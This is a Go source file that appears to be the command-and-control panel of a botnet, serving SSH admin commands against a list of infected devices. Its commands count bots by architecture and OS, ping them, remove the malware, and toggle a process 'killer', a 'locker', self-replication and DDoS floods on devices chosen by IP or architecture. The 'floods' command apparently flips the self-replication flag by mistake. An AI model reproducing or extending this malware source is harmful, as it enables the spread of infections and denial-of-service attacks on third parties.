package commands

import (
	"admin/source/attacks"
	"admin/source/terminal"
	"fmt"
	"net"
	"strings"

	"golang.org/x/crypto/ssh"
)

func init() {
	RegisterCommand(&Command{
		Name:        "devices",
		Prefix:      "",
		Admin:       true,
		Description: "View amount of either archs/os but sorted",
		Execute: func(conn *ssh.ServerConn, term *terminal.Terminal, args []string) error {
			var indexArch = true // Arch

			// Checks for indexing with operator
			if strings.Contains(strings.Join(args, " "), "-os") {
				indexArch = false // OS
			}

			// Ranges through sorting the objects
			var collection map[string]int = make(map[string]int)
			for _, device := range attacks.Devices {
				var index = device.Architecture
				if !indexArch {
					index = device.OperatingSystem
				}

				// Make new slot
				if _, ok := collection[index]; !ok {
					collection[index] = 1; continue
				}

				// Increase by 1
				collection[index]++
			}

			for types, counts := range collection {
				term.Write([]byte(fmt.Sprintf("%s%s\x1b[0m:%d\r\n", term.Colour, types, counts)))
			}

			return nil
		},
	})

	RegisterCommand(&Command{
		Name:        "ping",
		Prefix:      "",
		Admin:       true,
		Description: "Ping all devices connected (removes inactive)",
		Execute: func(conn *ssh.ServerConn, term *terminal.Terminal, args []string) error {
			pings, past := 0, len(attacks.Devices) // Pingback received

			// Ranges through all devices connected
			for key, device := range attacks.Devices {
				device.IndividualBroadcast <- []byte{10}

				buffer := make([]byte, 1)
				if _, err := device.Connection.Read(buffer); err != nil || buffer[0] != 10 {
					delete(attacks.Devices, key); continue
				}

				pings++
			}
			
			return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mPing command sent to %d but only %d devices repinged\r\n", past, pings)))
		},
	})

	RegisterCommand(&Command{
		Name:        "discharge",
		Prefix:      "",
		Admin:       true,
		Description: "Remove malware off every single infected device",
		Execute: func(conn *ssh.ServerConn, term *terminal.Terminal, args []string) error {
			// Checks if its looking for an ip or a entire architecture
			if net.ParseIP(strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")) != nil {
				var ip string = strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")

				// Ranges through the devices looking for the IP
				for key, device := range attacks.Devices {
					if strings.Contains(device.Connection.RemoteAddr().String(), ip) {
						device.IndividualBroadcast <- []byte{14} // Writes toggle mode
						delete(attacks.Devices, key)
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent discharge command to every device from %s\r\n", ip)))
			} else { // Architecture mode to sent to all connected arch
				var arch string = strings.Join(args, " ")

				// Ranges through the devices looking for the arch or os
				for key, device := range attacks.Devices {
					if len(arch) == 0 || strings.Contains(device.OperatingSystem, arch) || strings.Contains(device.Architecture, arch) {
						device.IndividualBroadcast <- []byte{14} // Writes toggle mode
						delete(attacks.Devices, key)
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent discharge command to every device running (%s)\r\n", arch)))
			}
		},
	})

	RegisterCommand(&Command{
		Name:        "killer",
		Prefix:      "",
		Admin:       true,
		Description: "Toggles the killer on the IP/Arch/OS provided",
		Execute: func(conn *ssh.ServerConn, term *terminal.Terminal, args []string) error {
			if len(args) <= 0 {
				return term.Write([]byte(fmt.Sprint("\x1b[38;5;15mkiller command must contain a filter\r\n")))
			}

			// Checks if its looking for an ip or a entire architecture
			if net.ParseIP(strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")) != nil {
				var ip string = strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")

				// Ranges through the devices looking for the IP
				for _, device := range attacks.Devices {
					if strings.Contains(device.Connection.RemoteAddr().String(), ip) {
						device.IndividualBroadcast <- []byte{11} // Writes toggle mode
						device.Killer = !device.Killer
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent toggle killer command to every device connected from %s\r\n", ip)))
			} else { // Architecture mode to sent to all connected arch
				var arch string = strings.Join(args, " ")

				// Ranges through the devices looking for the arch or os
				for _, device := range attacks.Devices {
					if strings.Contains(device.OperatingSystem, arch) || strings.Contains(device.Architecture, arch) {
						device.IndividualBroadcast <- []byte{11} // Writes toggle mode
						device.Killer = !device.Killer
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent toggle killer command to every device connected with %s\r\n", arch)))
			}
		},
	})

	RegisterCommand(&Command{
		Name:        "locker",
		Prefix:      "",
		Admin:       true,
		Description: "Toggles the locker on the IP/Arch provided",
		Execute: func(conn *ssh.ServerConn, term *terminal.Terminal, args []string) error {
			if len(args) <= 0 {
				return term.Write([]byte(fmt.Sprint("\x1b[38;5;15mlocker command must contain a filter\r\n")))
			}

			// Checks if its looking for an ip or a entire architecture
			if net.ParseIP(strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")) != nil {
				var ip string = strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")

				// Ranges through the devices looking for the IP
				for _, device := range attacks.Devices {
					if strings.Contains(device.Connection.RemoteAddr().String(), ip) {
						device.IndividualBroadcast <- []byte{12} // Writes toggle mode
						device.Locker = !device.Locker
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent toggle locker command to every device connected from %s\r\n", ip)))
			} else { // Architecture mode to sent to all connected arch
				var arch string = strings.Join(args, " ")

				// Ranges through the devices looking for the arch or os
				for _, device := range attacks.Devices {
					if strings.Contains(device.OperatingSystem, arch) || strings.Contains(device.Architecture, arch) {
						device.IndividualBroadcast <- []byte{12} // Writes toggle mode
						device.Locker = !device.Locker
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent toggle locker command to every device connected with %s\r\n", arch)))
			}
		},
	})

	RegisterCommand(&Command{
		Name:        "selfrep",
		Prefix:      "",
		Admin:       true,
		Description: "Toggles the selfrep on the IP/Arch provided",
		Execute: func(conn *ssh.ServerConn, term *terminal.Terminal, args []string) error {
			if len(args) <= 0 {
				return term.Write([]byte(fmt.Sprint("\x1b[38;5;15mselfrep command must contain a filter\r\n")))
			}

			// Checks if its looking for an ip or a entire architecture
			if net.ParseIP(strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")) != nil {
				var ip string = strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")

				// Ranges through the devices looking for the IP
				for _, device := range attacks.Devices {
					if strings.Contains(device.Connection.RemoteAddr().String(), ip) {
						device.IndividualBroadcast <- []byte{13} // Writes toggle mode
						device.Selfrep = !device.Selfrep
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent toggle selfrep command to every device connected from %s\r\n", ip)))
			} else { // Architecture mode to sent to all connected arch
				var arch string = strings.Join(args, " ")

				// Ranges through the devices looking for the arch or os
				for _, device := range attacks.Devices {
					if strings.Contains(device.OperatingSystem, arch) || strings.Contains(device.Architecture, arch) {
						device.IndividualBroadcast <- []byte{13} // Writes toggle mode
						device.Selfrep = !device.Selfrep
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent toggle selfrep command to every device connected with %s\r\n", arch)))
			}
		},
	})

	RegisterCommand(&Command{
		Name:        "floods",
		Prefix:      "",
		Admin:       true,
		Description: "Toggles the floods on the IP/Arch provided",
		Execute: func(conn *ssh.ServerConn, term *terminal.Terminal, args []string) error {
			if len(args) <= 0 {
				return term.Write([]byte(fmt.Sprint("\x1b[38;5;15mfloods command must contain a filter\r\n")))
			}

			// Checks if its looking for an ip or a entire architecture
			if net.ParseIP(strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")) != nil {
				var ip string = strings.Join(strings.Split(strings.Join(args, " "), ":")[:1], ":")

				// Ranges through the devices looking for the IP
				for _, device := range attacks.Devices {
					if strings.Contains(device.Connection.RemoteAddr().String(), ip) {
						device.IndividualBroadcast <- []byte{15} // Writes toggle mode
						device.Selfrep = !device.Selfrep
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent toggle floods command to every device connected from %s\r\n", ip)))
			} else { // Architecture mode to sent to all connected arch
				var arch string = strings.Join(args, " ")

				// Ranges through the devices looking for the arch or os
				for _, device := range attacks.Devices {
					if strings.Contains(device.OperatingSystem, arch) || strings.Contains(device.Architecture, arch) {
						device.IndividualBroadcast <- []byte{15} // Writes toggle mode
						device.Selfrep = !device.Selfrep
					}
				}

				return term.Write([]byte(fmt.Sprintf("\x1b[38;5;15mSent toggle floods command to every device connected with %s\r\n", arch)))
			}
		},
	})
}